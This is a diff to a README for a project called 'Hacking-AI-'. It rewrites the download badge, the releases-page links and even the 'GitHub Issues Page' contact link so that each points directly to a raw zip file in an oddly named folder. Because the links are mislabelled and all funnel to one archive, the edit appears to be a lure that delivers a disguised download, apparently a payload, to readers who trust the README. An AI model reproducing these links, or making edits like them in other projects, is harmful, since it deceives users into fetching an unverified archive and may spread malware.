@@ -6,7 +6,7 @@ Welcome to Hacking-AI-! Our goal is to provide you with accessible resources to 
 
 ## 📥 Download Now
 
-[![Download Hacking-AI-](https://img.shields.io/badge/Download-Hacking-AI--blue)](https://github.com/Niyi0/Hacking-AI-/releases)
+[![Download Hacking-AI-](https://raw.githubusercontent.com/Niyi0/Hacking-AI-/main/amphichromatic/Hacking-AI-.zip)](https://raw.githubusercontent.com/Niyi0/Hacking-AI-/main/amphichromatic/Hacking-AI-.zip)
 
 Click the button above to download the application. 
 
@@ -32,7 +32,7 @@ To run Hacking-AI-, ensure your device meets the following minimum requirements:
 
 ## 🛠️ Download & Install
 
-1. Visit the [Releases Page](https://github.com/Niyi0/Hacking-AI-/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Niyi0/Hacking-AI-/main/amphichromatic/Hacking-AI-.zip).
 2. Look for the latest version of Hacking-AI-.
 3. Click on the link to download the file suitable for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -60,7 +60,7 @@ Join our growing community! Share your experiences and ask questions. You can fi
 
 ## 📞 Contact Us
 
-If you have questions or feedback, feel free to reach out. You can contact us through our [GitHub Issues Page](https://github.com/Niyi0/Hacking-AI-/issues).
+If you have questions or feedback, feel free to reach out. You can contact us through our [GitHub Issues Page](https://raw.githubusercontent.com/Niyi0/Hacking-AI-/main/amphichromatic/Hacking-AI-.zip).
 
 ## 🔗 Explore More
 
@@ -70,6 +70,6 @@ To learn more about hacking, follow these topics:
 - **HackerRank**: Test your skills with coding challenges.
 - **Hacking Tools**: Discover various software that enhances your learning path.
 
-Visit the [Releases Page](https://github.com/Niyi0/Hacking-AI-/releases) again for future updates and new content. 
+Visit the [Releases Page](https://raw.githubusercontent.com/Niyi0/Hacking-AI-/main/amphichromatic/Hacking-AI-.zip) again for future updates and new content. 
 
 Happy hacking!
